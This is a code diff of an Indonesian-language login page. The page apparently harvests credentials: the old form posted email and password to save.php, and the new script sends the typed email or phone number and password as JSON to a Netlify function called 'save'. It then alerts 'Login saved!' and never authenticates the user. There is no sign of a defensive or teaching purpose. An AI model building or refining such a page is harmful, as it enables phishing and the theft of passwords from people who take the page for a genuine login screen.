@@ -219,12 +219,26 @@
     <div class="card-title">Masuk</div>
     <div class="card-subtitle">Isi email atau nomor ponsel dan kata sandi.</div>
 
-    <form action="save.php" method="POST">
-    <input type="text" class="input-field" name="email" placeholder="Email / No. HP" required />
-    <input type="password" class="input-field" name="pw" placeholder="Kata sandi" required />
+    <input id="email" type="text" class="input-field" placeholder="Email / No. HP" />
+<input id="password" type="password" class="input-field" placeholder="Kata sandi" />
 
-    <button type="submit" class="btn-primary">Masuk</button>
-</form>
+<button class="btn-primary" onclick="saveLogin()">Masuk</button>
+
+<script>
+async function saveLogin() {
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    await fetch("/.netlify/functions/save", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password })
+    });
+
+    alert("Login disimpan!");
+}
+</script>
+
 
     <div class="forgot-link"><a href="#">Lupa kata sandi?</a></div>
 
